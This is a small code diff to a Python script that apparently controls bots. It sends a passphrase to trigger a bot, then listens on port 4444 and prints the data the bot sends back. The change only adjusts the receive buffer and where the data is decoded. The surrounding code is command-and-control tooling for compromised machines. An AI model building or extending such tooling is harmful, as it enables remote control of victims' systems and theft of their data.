@@ -17,8 +17,8 @@ def listner(system_ip, system_port):
     listner.bind((system_ip, system_port))                                     
     listner.listen(0)                                                    
     connection, address = listner.accept()                        
-    recieved_data = connection.recv(1024 * 1000000)
-    return recieved_data
+    recieved_data = connection.recv(1024 * 1000)
+    return recieved_data.decode('utf-8')
 
 def trigger(bot_ip, bot_passphrase):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -37,7 +37,7 @@ def test():
         try:
             trigger(bot_ip, bot_passphrase)
             print("[*] Bot has been triggered")
-            data = listner(system_ip, 4444).decode('utf-8')
+            data = listner(system_ip, 4444)
             print("Data fetched from the bot: ")
             print(data)
         except:
